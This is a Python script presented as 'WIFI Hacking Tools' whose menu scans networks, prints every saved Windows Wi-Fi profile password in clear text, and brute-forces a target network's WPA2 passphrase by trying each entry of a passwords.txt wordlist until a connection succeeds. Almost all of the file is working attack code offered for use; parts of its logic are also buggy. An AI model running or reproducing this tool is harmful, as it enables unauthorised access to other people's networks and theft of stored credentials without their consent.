try:
    import os
    import platform
    import time
    import subprocess
    import requests


    def savedWIFI():
        if platform.system() == "Windows":
                a = subprocess.check_output(['netsh', 'wlan', 'show', 'profile']).decode('utf-8').split('\n')
                a = [i.split(":")[1][1:-1] for i in a if "All User Profile" in i]

                for i in a:
                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
                    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]

                    try:
                        print("{:<30}| {:<}". format(i, results[0]))
                    except IndexError:
                        print("{:<30}| {:<}". format(i, ""))
                
                time.sleep(1)
                main()

        elif platform.system() == "Linux":
            print("\n[ERROR] This command currently doesnt work on linux, check for new versions")
            time.sleep(1)
            main()

    def WifiBruteForce():
        url = "http://www.python.org"
        timeout = 5
        def createNewConnection(name, SSID, key):
            config = """<?xml version=\"1.0\"?>
        <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
            <name>"""+name+"""</name>
            <SSIDConfig>
                <SSID>
                    <name>"""+SSID+"""</name>
                </SSID>
            </SSIDConfig>
            <connectionType>ESS</connectionType>
            <connectionMode>auto</connectionMode>
            <MSM>
                <security>
                    <authEncryption>
                        <authentication>WPA2PSK</authentication>
                        <encryption>AES</encryption>
                        <useOneX>false</useOneX>
                    </authEncryption>
                    <sharedKey>
                        <keyType>passPhrase</keyType>
                        <protected>false</protected>
                        <keyMaterial>"""+key+"""</keyMaterial>
                    </sharedKey>
                </security>
            </MSM>
        </WLANProfile>"""
            if platform.system() == "Windows":
                command = "netsh wlan add profile filename=\""+name+".xml\""+" interface=Wi-Fi"
                with open(name+".xml", 'w') as file:
                    file.write(config)
            elif platform.system() == "Linux":
                command = "nmcli dev wifi connect '"+SSID+"' password '"+key+"'"
            os.system(command)
            if platform.system() == "Windows":
                os.remove(name+".xml")

        def connect(name, SSID):
            os.system("netsh wlan connect name=\""+name+"\" ssid=\""+SSID+"\" interface=Wi-Fi")

        def displayAvailableNetworks():
            os.system("netsh wlan show networks interface=Wi-Fi")

        print("[LOADING] Searching if connected to any network")

        try:
            request = requests.get(url, timeout=timeout)
            print("[-] Please disconnect your internet for this operation to work, try again later"), main()
            
        except (requests.ConnectionError, requests.Timeout) as exception:
            print("[LOADING] Loading program..."), time.sleep(1)

        connected = True
        while connected:
            try:
                displayAvailableNetworks()
                WIFI = input("WIFI Name: ")
                with open("passwords.txt", "r") as f:
                    for line in f:
                        words = line.split()
                        if words:
                            print(f"Password: {words[0]}")
                            
                            createNewConnection(WIFI, WIFI, words[0])
                            connect(WIFI, WIFI)

                            try:
                                request = requests.get(url, timeout=timeout)
                                connected = False
                                choice = input(f"[+] The password might have been cracked, are you connected to {WIFI} (y/N) ? ")
                                if choice == "y":
                                    print("\n[EXITING] Operation canceled")
                                    main()
                                elif choice == "n":
                                    print("\n[-] Operation continues\n")
                                
                            except (requests.ConnectionError, requests.Timeout) as exception:
                                print("[LOADING] Loading program..."), time.sleep(1)

                print("[+] Operation complete")
                choice = input("See WIFI Information (y/N) ? ")
                if choice == "y" or "Y":
                    print(f"[LOADING] Searching for {WIFI} network")
                    time.sleep(1)
                    os.system(f'netsh wlan show profile name="{WIFI}" key=clear')
                    main()
                elif choice == "n" or "N":
                    print("\n[EXITING] Exiting program...")
                    time.sleep(2)
                    main()

            except KeyboardInterrupt:
                print("\n[[EXITING] Aborting program...")
                exit()
            except:
                print("[ERROR] Make sure passwords.txt is in the same directory as this file")
                main()

    def main():
        time.sleep(1)
        print("\n")
        print("[OPTIONS] Select A Option Below\n")
        time.sleep(1)
        print("1 - Scan WIFI Netorks ")
        print("2 - See Saved WIFI Passwords")
        print("3 - Brute Force A WIFI")
        print("0 - Exit")
        a = input("-> ")
        if a == "1":
            if platform.system() == "Windows":
                os.system("netsh wlan show network")
                time.sleep(2)
                main()
            elif platform.system() == "Linux":
                print("\n[ERROR] This command currently doesnt work on linux, check for new versions")
                time.sleep(1)
                main()

        elif a == "2":
            print("\n")
            savedWIFI()
        elif a == "3":
            print("\n")
            WifiBruteForce()
        elif a == "0":
            print("\n[EXITING] Exiting Program...")
            exit()
        else:
            os.system("cls")
            print("Unkown command, try again later")
            time.sleep(2)
            os.system("cls")
            main()
except KeyboardInterrupt:
        print("\n[[EXITING] Aborting program...")
        exit()
except ImportError:
        print("\n[ERROR] An error occured getting the modules, try installing requestss")
        exit()

print("""
   .               .
 .´  ·  .     .  ·  `.  WIFI Hacking Tools
 :  :  :  (¯)  :  :  :  Brute Force WIFI For Windows And Linux
 `.  ·  ` /¯\ ´  ·  .´  Maintained by Jacob
   `     /¯¯¯\     ´
""")
main()